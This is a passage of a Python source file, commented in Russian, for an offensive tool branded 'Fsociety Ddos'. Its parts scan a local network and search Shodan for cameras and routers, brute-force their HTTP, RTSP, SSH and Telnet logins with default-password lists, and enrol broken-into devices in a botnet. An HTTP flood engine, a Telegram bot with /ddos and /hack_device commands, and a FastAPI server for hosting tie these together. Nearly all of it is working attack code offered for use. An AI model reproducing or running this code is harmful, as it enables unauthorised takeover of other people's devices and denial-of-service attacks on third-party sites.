    def __init__(self, network="192.168.1.0/24"):
        self.network = network
    async def ping_sweep(self):
        base = self.network.split('/')[0]
        ip_parts = base.split('.')
        if len(ip_parts) != 4:
            return []
        prefix = '.'.join(ip_parts[:3]) + '.'
        devices = []
        for i in range(1, 255):
            ip = prefix + str(i)
            proc = await asyncio.create_subprocess_exec(
                'ping', '-c', '1', '-W', '1', ip,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL
            )
            code = await proc.wait()
            if code == 0:
                devices.append({'ip': ip, 'type': 'unknown'})
        return devices
    async def full_scan(self):
        try:
            return await self.ping_sweep()
        except:
            return []

# ------------------------------------------------------------
#  Улучшенный взломщик IoT
# ------------------------------------------------------------
class IoTExploiter:
    def __init__(self, botnet):
        self.botnet = botnet
        self.usernames = [
            "admin", "root", "user", "support", "guest", "administrator", "operator",
            "service", "tech", "dvr", "ipcam", "admin1", "admin2", "supervisor"
        ]
        self.passwords = [
            "admin", "1234", "12345", "password", "pass", "123456", "root", "user",
            "support", "guest", "admin123", "adminadmin", "12345678", "123456789",
            "qwerty", "abc123", "111111", "000000", "888888", "666666", "admin1",
            "admin2", "ipcam", "dvr", "123", "password123", "letmein", "welcome",
            "changeme", "default", "1234567890", "123123", "0000", "1111", "222222"
        ]
        self.common_ports = [80, 8080, 554, 8000, 5000, 443, 8443, 37777, 81, 88]

    async def brute_http(self, ip, port, auth_type='basic'):
        """Перебор HTTP Basic Auth или Digest"""
        for u in self.usernames:
            for p in self.passwords:
                try:
                    if auth_type == 'basic':
                        r = requests.get(f"http://{ip}:{port}", auth=(u, p), timeout=3)
                    else:
                        r = requests.get(f"http://{ip}:{port}", auth=requests.auth.HTTPDigestAuth(u, p), timeout=3)
                    if r.status_code == 200:
                        return (u, p)
                except:
                    continue
        return None

    async def brute_rtsp(self, ip, port=554):
        """Проверка RTSP (часто без пароля или стандартный)"""
        for u in self.usernames:
            for p in self.passwords:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    sock.connect((ip, port))
                    creds = base64.b64encode(f"{u}:{p}".encode()).decode()
                    sock.send(f"DESCRIBE rtsp://{ip}:{port}/ RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic {creds}\r\n\r\n".encode())
                    data = sock.recv(1024)
                    if b'200 OK' in data:
                        sock.close()
                        return (u, p)
                    sock.close()
                except:
                    continue
        return None

    async def brute_ssh(self, ip, port=22):
        for u in self.usernames:
            for p in self.passwords:
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(ip, port=port, username=u, password=p, timeout=3)
                    return (u, p, client)
                except:
                    continue
        return None

    async def brute_telnet(self, ip, port=23):
        for u in self.usernames:
            for p in self.passwords:
                try:
                    tn = telnetlib.Telnet(ip, port, timeout=3)
                    tn.read_until(b"login: ")
                    tn.write(u.encode() + b"\n")
                    tn.read_until(b"Password: ")
                    tn.write(p.encode() + b"\n")
                    result = tn.read_some()
                    if b"incorrect" not in result.lower():
                        tn.close()
                        return (u, p)
                    tn.close()
                except:
                    continue
        return None

    async def hack_camera(self, ip, port=None):
        """Взлом камеры: если порт не указан, перебирает стандартные"""
        if port:
            ports = [port]
        else:
            ports = self.common_ports
        for p in ports:
            # HTTP Basic
            creds = await self.brute_http(ip, p)
            if creds:
                await self.botnet.add_zombie(ip, "camera")
                stats["cracked_devices"].append(f"camera_{ip}:{p}")
                save_stats(stats)
                return True
            # RTSP
            if p == 554:
                creds = await self.brute_rtsp(ip, p)
                if creds:
                    await self.botnet.add_zombie(ip, "camera")
                    stats["cracked_devices"].append(f"camera_{ip}_rtsp")
                    save_stats(stats)
                    return True
        return False

    async def hack_router(self, ip, port=None):
        """Взлом роутера: HTTP, SSH, Telnet"""
        # HTTP
        creds = await self.brute_http(ip, port or 80)
        if creds:
            await self.botnet.add_zombie(ip, "router")
            stats["cracked_devices"].append(f"router_{ip}")
            save_stats(stats)
            return True
        # SSH
        ssh_creds = await self.brute_ssh(ip)
        if ssh_creds:
            u, p, client = ssh_creds
            await self.botnet.add_zombie(ip, "router", client)
            stats["cracked_devices"].append(f"router_{ip}_ssh")
            save_stats(stats)
            return True
        # Telnet
        telnet_creds = await self.brute_telnet(ip)
        if telnet_creds:
            u, p = telnet_creds
            await self.botnet.add_zombie(ip, "router")
            stats["cracked_devices"].append(f"router_{ip}_telnet")
            save_stats(stats)
            return True
        return False

    async def hack_device(self, ip, device_type=None, port=None):
        """Универсальный взлом: если тип не указан, пробует оба"""
        if device_type == 'camera':
            return await self.hack_camera(ip, port)
        elif device_type == 'router':
            return await self.hack_router(ip, port)
        else:
            if await self.hack_camera(ip, port):
                return True
            return await self.hack_router(ip, port)

# ------------------------------------------------------------
#  Глобальный поиск через Shodan
# ------------------------------------------------------------
class GlobalHunter:
    def __init__(self):
        self.shodan_key = os.environ.get("SHODAN_API_KEY")
        self.shodan_cli = None
        if SHODAN_AVAILABLE and self.shodan_key and self.shodan_key.strip():
            try:
                self.shodan_cli = shodan.Shodan(self.shodan_key)
            except Exception as e:
                print(f"Shodan init error: {e}")
    async def search_shodan(self, query, limit=100):
        if not self.shodan_cli:
            return []
        loop = asyncio.get_event_loop()
        try:
            res = await loop.run_in_executor(None, lambda: self.shodan_cli.search(query, limit=limit))
            devices = []
            for r in res.get('matches', []):
                devices.append({
                    'ip': r['ip_str'],
                    'port': r['port'],
                    'type': 'camera' if 'camera' in r.get('data','').lower() else 'router',
                    'source': 'shodan'
                })
            return devices
        except Exception as e:
            print(f"Shodan search error: {e}")
            raise e
    async def global_search(self, query, limit=100):
        return await self.search_shodan(query, limit)

# ------------------------------------------------------------
#  DDoS-движок
# ------------------------------------------------------------
class DDoSEngine:
    def __init__(self, proxy):
        self.proxy = proxy
    async def http_flood(self, url):
        async with self.proxy.get_session() as session:
            for _ in range(500):
                try:
                    await session.get(url, headers={"User-Agent": random.choice(USER_AGENTS)})
                except:
                    pass
        return True
    async def adapt_attack(self, target):
        await self.http_flood(target)
        return True

# ------------------------------------------------------------
#  Основной бот
# ------------------------------------------------------------
class AdminBot:
    def __init__(self):
        self.botnet = ZombieBotnet()
        self.scanner = NetworkScanner()
        self.exploiter = IoTExploiter(self.botnet)
        self.hunter = GlobalHunter()
        self.ddos = DDoSEngine(ProxyManager())
        self.blockchain = BlockchainLogger()
        self.berserk = False
        self.telegram_app = None

    async def start_local_scan_loop(self, interval=300):
        while True:
            devices = await self.scanner.full_scan()
            await self.exploiter.hack_all(devices)
            await asyncio.sleep(interval)

    async def start_telegram_bot(self):
        token = os.environ.get("TELEGRAM_TOKEN")
        if not token:
            print("TELEGRAM_TOKEN not set")
            return
        try:
            from telegram.ext import Application, CommandHandler
        except ImportError:
            print("python-telegram-bot not installed")
            return
        app = Application.builder().token(token).build()

        async def tg_start(update, context):
            await update.message.reply_text(
                "Fsociety Ddos:\nБот запущен. Доступные команды:\n"
                "/ddos <target>\n"
                "/global_scan <query> [limit]\n"
                "/status\n"
                "/hack_device <ip> <camera|router> [port]"
            )

        async def tg_ddos(update, context):
            target = context.args[0] if context.args else ""
            if not target:
                await update.message.reply_text("Использование: /ddos <target>")
                return
            await self.ddos.adapt_attack(target)
            await self.botnet.launch_attack(target)
            await update.message.reply_text(f"Fsociety Ddos:\nАтака на {target} запущена с {self.botnet.size()} зомби.")

        async def tg_global_scan(update, context):
            query = context.args[0] if context.args else "webcam"
            limit = int(context.args[1]) if len(context.args) > 1 else 50
            try:
                devices = await self.hunter.global_search(query, limit)
                if not devices:
                    msg = f"Fsociety Ddos:\nНайдено 0 устройств. Проверьте Shodan API ключ и запрос."
                else:
                    for dev in devices:
                        if dev['type'] == 'camera':
                            await self.exploiter.hack_camera(dev['ip'])
                        else:
                            await self.exploiter.hack_router(dev['ip'])
                    msg = f"Fsociety Ddos:\nНайдено {len(devices)} устройств, взлом запущен."
            except Exception as e:
                msg = f"Fsociety Ddos:\nОшибка: {str(e)}"
            await update.message.reply_text(msg)

        async def tg_status(update, context):
            msg = (f"Fsociety Ddos:\nЗомби: {self.botnet.size()}\n"
                   f"Взломано локально: {len(stats['cracked_devices'])}\n"
                   f"Глобально найдено: {stats['global_found']}")
            await update.message.reply_text(msg)

        async def tg_hack_device(update, context):
            if len(context.args) < 2:
                await update.message.reply_text("Использование: /hack_device <ip> <camera|router> [port]")
                return
            ip = context.args[0]
            dtype = context.args[1] if context.args[1] in ['camera', 'router'] else None
            port = None
            if len(context.args) > 2:
                try:
                    port = int(context.args[2])
                except:
                    pass
            res = await self.exploiter.hack_device(ip, dtype, port)
            if res:
                await update.message.reply_text(f"Fsociety Ddos:\nУстройство {ip} взломано и добавлено в ботнет.")
            else:
                await update.message.reply_text(f"Fsociety Ddos:\nНе удалось взломать {ip}. Попробуйте указать порт или другой тип.")

        app.add_handler(CommandHandler("start", tg_start))
        app.add_handler(CommandHandler("ddos", tg_ddos))
        app.add_handler(CommandHandler("global_scan", tg_global_scan))
        app.add_handler(CommandHandler("status", tg_status))
        app.add_handler(CommandHandler("hack_device", tg_hack_device))

        await app.initialize()
        await app.start()
        await app.updater.start_polling()
        self.telegram_app = app
        print("Telegram bot started")

    async def run_background(self):
        asyncio.create_task(self.start_local_scan_loop())
        if os.environ.get("TELEGRAM_TOKEN"):
            asyncio.create_task(self.start_telegram_bot())

# ------------------------------------------------------------
#  FastAPI веб-сервер для Railway
# ------------------------------------------------------------
bot_instance = AdminBot()

@asynccontextmanager
async def lifespan(app: FastAPI):
    asyncio.create_task(bot_instance.run_background())
    yield

app = FastAPI(lifespan=lifespan)

@app.get("/")
async def root():
    return {"status": "bot running", "zombies": bot_instance.botnet.size()}

@app.get("/status")
async def status():
    return {
        "zombies": bot_instance.botnet.size(),
        "cracked_local": len(stats["cracked_devices"]),
        "global_found": stats["global_found"],
        "total_requests": stats["total_requests"]
    }

# ------------------------------------------------------------
#  Точка входа
# ------------------------------------------------------------
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port) 
